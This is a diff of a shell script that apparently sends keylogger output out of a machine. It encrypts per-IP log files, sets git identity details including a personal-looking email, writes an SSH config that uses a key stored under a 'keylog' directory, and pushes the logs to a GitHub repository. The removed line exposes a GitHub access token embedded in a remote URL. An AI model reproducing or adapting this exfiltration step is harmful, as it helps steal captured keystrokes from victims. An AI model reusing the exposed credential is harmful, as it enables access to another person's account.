@@ -21,6 +21,9 @@ openssl rsautl -encrypt -inkey key_public.pem -pubin -in "logs/$ip.txt" -out "lo
 git config user.email "spencer.stevens@verizon.net"
 git config user.name "dummy000000"
 
+echo "Host github.com
+    IdentityFile /etc/keylog/git_id_rsa" > "~/.ssh/config"
+
 # add
 git add .
 
@@ -28,7 +31,6 @@ git add .
 git commit -m "update"
 
 # push
-git remote set-url origin https://dummy000000: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@github.com/Sad-0w/CS564_data.git
 git push
 
 # extract all encrypted scripts
